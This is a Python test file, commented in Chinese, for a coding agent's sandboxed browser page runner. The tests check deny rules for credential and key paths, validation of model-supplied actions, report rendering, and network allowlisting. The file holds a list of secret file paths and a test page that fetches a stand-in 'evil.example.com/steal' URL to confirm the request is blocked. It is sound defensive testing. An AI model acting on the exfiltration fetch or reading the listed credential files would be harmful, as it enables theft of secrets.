"""本地页面运行器的测试。

分两层：
  · 不需要浏览器的单元测试（静态服务的敏感路径拒绝、动作校验、报告渲染、依赖探测）
  · 真正启动 Edge/Chrome 的集成测试（找不到浏览器就 skip）
"""

import json
import urllib.request
import zipfile

import pytest

from coding_agent import browser as browser_mod
from coding_agent.browser import (
    BrowserError,
    WorkspaceServer,
    _normalize_actions,
    attach_small_screenshot,
    browser_status,
    find_node,
    format_report,
    is_sensitive_relative,
    render_page,
    visible_playwright_candidates,
)


# --------------------------------------------------------------------------- #
# 静态服务的敏感路径拒绝（同源读取是这里最容易漏的一条）
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("relative", [
    ".env", ".env.local", "cert.pem", "id_rsa", "server.key",
    "sessions/abc.json", "sub/sessions/abc.json",
    ".ssh/id_rsa", "config/.aws/credentials", "secrets/token.txt",
    ".git/config", ".agent-lite/tool-results/x.txt", ".agent-lite/network.log",
])
def test_sensitive_paths_are_denied(relative):
    assert is_sensitive_relative(relative) is True


@pytest.mark.parametrize("relative", [
    "index.html", "src/main.js", "styles/app.css", "assets/hero.png",
    "README.md", "showcase/index.html", "environment.json",
])
def test_normal_paths_are_served(relative):
    assert is_sensitive_relative(relative) is False


def test_workspace_server_refuses_secrets_over_http(tmp_path):
    (tmp_path / "index.html").write_text("<h1>ok</h1>", encoding="utf-8")
    (tmp_path / ".env").write_text("CMD_API_KEY=SUPER_SECRET\n", encoding="utf-8")
    (tmp_path / "sessions").mkdir()
    (tmp_path / "sessions" / "abc.json").write_text('{"secret": "history"}', encoding="utf-8")

    with WorkspaceServer(tmp_path) as base:
        assert "ok" in urllib.request.urlopen(base + "index.html", timeout=10).read().decode()

        for blocked in (".env", "sessions/abc.json"):
            try:
                urllib.request.urlopen(base + blocked, timeout=10)
                pytest.fail(f"{blocked} 竟然可以被页面读到")
            except urllib.error.HTTPError as exc:
                assert exc.code == 403


def test_workspace_server_has_no_directory_listing(tmp_path):
    (tmp_path / "index.html").write_text("x", encoding="utf-8")
    (tmp_path / "assets").mkdir()
    (tmp_path / "assets" / "app.js").write_text("//x", encoding="utf-8")
    with WorkspaceServer(tmp_path) as base:
        # 有 index.html 时根本目录是正常的
        assert urllib.request.urlopen(base, timeout=10).status == 200
        # 没有 index 的子目录不给列表
        with pytest.raises(urllib.error.HTTPError) as excinfo:
            urllib.request.urlopen(base + "assets/", timeout=10)
        assert excinfo.value.code == 403


# --------------------------------------------------------------------------- #
# 动作校验（模型给的东西一律当不可信输入）
# --------------------------------------------------------------------------- #
def test_actions_are_normalized():
    actions = _normalize_actions([
        {"type": "drag", "from": [600, 400], "to": [760, 430]},
        {"type": "wheel", "dy": -250},
        {"type": "click", "at": [10, 20]},
        {"type": "wait", "ms": 500},
    ])
    assert [a["type"] for a in actions] == ["drag", "wheel", "click", "wait"]
    assert actions[0]["to"] == [760, 430]


@pytest.mark.parametrize("bad", [
    "drag",                                  # 不是数组
    [{"type": "hack"}],                      # 未知动作
    [{"type": "drag", "from": [1, 2]}],       # 缺 to
    [{"type": "click"}],                     # 缺 at
    [{"type": "drag", "from": [1, 2], "to": [3, 4]}] * 13,   # 超量
])
def test_bad_actions_are_rejected(bad):
    with pytest.raises(BrowserError):
        _normalize_actions(bad)


# --------------------------------------------------------------------------- #
# 报告渲染
# --------------------------------------------------------------------------- #
def _report(**over):
    base = {
        "ok": False, "channel": "msedge", "load_ms": 120,
        "errors": ["console.error: SHADER: ERROR: 0:130: 'a' : vector field selection out of range"],
        "warnings": [], "blocked": [{"url": "https://evil.example.com/x.js", "reason": "not in allowlist"}],
        "contacted": [], "page": {"title": "scene", "text": "hello", "canvases": [{"width": 1200, "height": 850}],
                                  "elements": 42},
        "screenshots": {"full": "a.png"}, "changed": None, "page_file": "index.html",
    }
    base.update(over)
    return base


def test_format_report_surfaces_browser_errors_and_blocked_requests():
    text = format_report(_report())
    assert "BROWSER ERRORS (1)" in text
    assert "vector field selection out of range" in text     # 正是当年人工抄回来的那类错误
    assert "Canvas: 1200x850" in text
    assert "被拦截的请求" in text and "evil.example.com" in text


def test_format_report_celebrates_a_clean_page():
    text = format_report(_report(errors=[], blocked=[], ok=True))
    assert "没有 pageerror / console.error" in text
    assert "BROWSER ERRORS" not in text


def test_format_report_reports_interaction_result():
    assert "发生了变化" in format_report(_report(changed=True))
    assert "没有任何变化" in format_report(_report(changed=False))
    assert "交互验证" not in format_report(_report(changed=None))


def test_format_report_handles_fatal():
    text = format_report({"fatal": "无法启动浏览器"})
    assert text.startswith("Error:") and "无法启动浏览器" in text


# --------------------------------------------------------------------------- #
# 依赖探测
# --------------------------------------------------------------------------- #
def test_candidates_always_include_the_bare_module_name():
    assert "playwright" in visible_playwright_candidates()


def test_attach_skips_oversized_screenshot(tmp_path, monkeypatch):
    big = tmp_path / "big.jpg"
    big.write_bytes(b"x" * (browser_mod.MAX_ATTACH_BYTES + 1))
    report = {"screenshots": {"small": str(big)}}
    assert attach_small_screenshot(tmp_path, report) is None

    small = tmp_path / "small.jpg"
    small.write_bytes(zipfile.ZipFile  and b"\xff\xd8\xff" + b"y" * 100)
    assert attach_small_screenshot(tmp_path, {"screenshots": {"small": str(small)}})["type"] == "image_url"


def test_render_page_rejects_paths_outside_the_workspace(tmp_path):
    with pytest.raises(BrowserError, match="工作目录内"):
        render_page(tmp_path, "../outside.html")


def test_render_page_reports_missing_file(tmp_path):
    with pytest.raises(BrowserError, match="找不到页面"):
        render_page(tmp_path, "nope.html")


# --------------------------------------------------------------------------- #
# 集成：真的启动浏览器（没有可用浏览器/playwright 就跳过）
# --------------------------------------------------------------------------- #
_STATUS = browser_status()
_AVAILABLE, _WHY, _DETAIL = _STATUS
_needs_browser = pytest.mark.skipif(not _AVAILABLE, reason=f"页面运行器不可用: {_WHY}")

PAGE_OK = """<!DOCTYPE html><html><head><meta charset="utf-8"><title>t</title></head>
<body><canvas id="c" width="400" height="300"></canvas>
<script>
const gl = document.getElementById('c').getContext('webgl');
const rot = {x: 0};
function draw() {
  gl.clearColor(rot.x ? 0.1 : 0.9, 0.2, 0.3, 1); gl.clear(gl.COLOR_BUFFER_BIT);
  requestAnimationFrame(draw);
}
draw();
document.addEventListener('mousemove', e => { rot.x = e.movementX; });
document.addEventListener('wheel', e => { rot.x = e.deltaY; });
</script></body></html>"""

PAGE_BROKEN = """<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
<script>
const gl = document.createElement('canvas').getContext('webgl');
// 故意的着色器错误：vec3 变量上取 .xyz.par，正是当年那种错误
const vs = 'attribute vec3 a; void main(){ gl_Position = vec4(a.xyz.par, 1.0); }';
const sh = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(sh, vs); gl.compileShader(sh);
if (!gl.getShaderParameter(sh, gl.COMPILE_STATUS)) {
  console.error('SHADER: ' + gl.getShaderInfoLog(sh));
}
undefinedFunctionCall();   // pageerror
</script></body></html>"""


@_needs_browser
def test_real_browser_catches_errors_and_verified_interaction(tmp_path):
    (tmp_path / "ok.html").write_text(PAGE_OK, encoding="utf-8")
    (tmp_path / "broken.html").write_text(PAGE_BROKEN, encoding="utf-8")

    good = render_page(tmp_path, "ok.html", wait_ms=800, screenshot=True)
    assert good["fatal"] is None, good["fatal"]
    assert good["channel"] in ("msedge", "chrome", "bundled-chromium")
    assert good["errors"] == [], good["errors"]
    assert good["page"]["canvases"] == [{"width": 400, "height": 300}]
    assert good["screenshots"].get("full") and good["screenshots"].get("small")

    # 真正的交互验证：拖动之后画面必须变化
    moved = render_page(tmp_path, "ok.html", wait_ms=600, screenshot=False,
                        actions=[{"type": "drag", "from": [200, 150], "to": [320, 180]}])
    assert moved["changed"] is True

    bad = render_page(tmp_path, "broken.html", wait_ms=600, screenshot=False)
    joined = "\n".join(bad["errors"])
    assert "SHADER" in joined or "shader" in joined.lower()   # 着色器编译错误被抓到
    assert "undefinedFunctionCall" in joined                   # pageerror 被抓到
    assert bad["ok"] is False
    assert "BROWSER ERRORS" in format_report(bad)


@_needs_browser
def test_real_browser_blocks_non_allowlisted_requests(tmp_path):
    page = """<!DOCTYPE html><html><body><script>
fetch('https://evil.example.com/steal').catch(() => {});
</script></body></html>"""
    (tmp_path / "net.html").write_text(page, encoding="utf-8")

    report = render_page(tmp_path, "net.html", wait_ms=800, screenshot=False)
    blocked_urls = [item["url"] for item in report["blocked"]]
    assert any("evil.example.com" in url for url in blocked_urls), report["blocked"]
    # 审计日志也要记下这次运行
    log = (tmp_path / ".agent-lite" / "network.log").read_text(encoding="utf-8")
    assert "render-page" in log
